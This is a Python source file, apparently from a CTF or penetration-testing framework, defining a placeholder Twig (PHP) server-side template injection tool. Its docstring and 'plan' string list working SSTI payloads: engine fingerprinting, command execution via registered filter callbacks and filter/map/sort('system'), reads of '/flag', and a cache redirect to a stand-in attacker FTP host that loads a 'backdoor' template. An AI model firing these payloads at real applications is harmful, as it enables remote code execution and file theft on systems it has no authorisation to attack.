"""Twig SSTI 利用 —— 占位符(逐引擎实现,本文件待实现)。

实现要点:
指纹: {{7*7}}→49、{{constant('PHP_VERSION')}}、{{_self.env}}→Twig Environment(核心攻击面)。
RCE: {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter(cmd)}}
Twig 1/2: {{[cmd]|filter('system')}}、{{[cmd]|map('system')}};Twig 1.x: {{[cmd,0]|sort('system')}}。
文件读: {{source('/flag')}}、{{include('/flag')}}。
老版本逃逸: {{_self.env.setCache("ftp://attacker:2121")}}{{_self.env.loadTemplate("backdoor")}} 缓存目录指向攻击者 FTP 触发 SSRF。

仅用于授权 CTF / 安全测试环境。
"""
from app.core.registry import register_tool

from tools.web.ssti_base import SstiEngineTool


@register_tool
class SstiTwigTool(SstiEngineTool):
    name = "ssti_twig"
    description = "Twig(PHP) SSTI:回调注册 RCE、filter/map/sort 传函数名、source/include 文件读(占位符)"
    engine_key = "twig"
    engine_name = "Twig"
    default_mode = "exec"
    plan = r"""指纹: {{7*7}}→49、{{constant('PHP_VERSION')}}、{{_self.env}}→Twig Environment(核心攻击面)。
RCE: {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter(cmd)}}
Twig 1/2: {{[cmd]|filter('system')}}、{{[cmd]|map('system')}};Twig 1.x: {{[cmd,0]|sort('system')}}。
文件读: {{source('/flag')}}、{{include('/flag')}}。
老版本逃逸: {{_self.env.setCache("ftp://attacker:2121")}}{{_self.env.loadTemplate("backdoor")}} 缓存目录指向攻击者 FTP 触发 SSRF。"""
